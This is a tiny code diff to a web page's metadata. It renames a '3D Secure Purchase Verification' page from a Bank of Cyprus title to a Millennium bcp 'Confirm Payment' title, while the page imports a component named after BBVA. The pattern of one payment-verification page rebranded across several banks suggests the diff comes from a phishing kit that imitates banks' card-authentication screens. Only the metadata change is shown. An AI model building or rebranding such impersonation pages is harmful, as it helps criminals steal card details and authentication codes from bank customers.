@@ -1,7 +1,7 @@
 import BbvaPage from "../page"
 
 export const metadata = {
-  title: "Bank of Cyprus — Πιστοποίηση Αγοράς",
+  title: "Millennium bcp — Confirm Payment",
   description: "3D Secure Purchase Verification",
 }
 
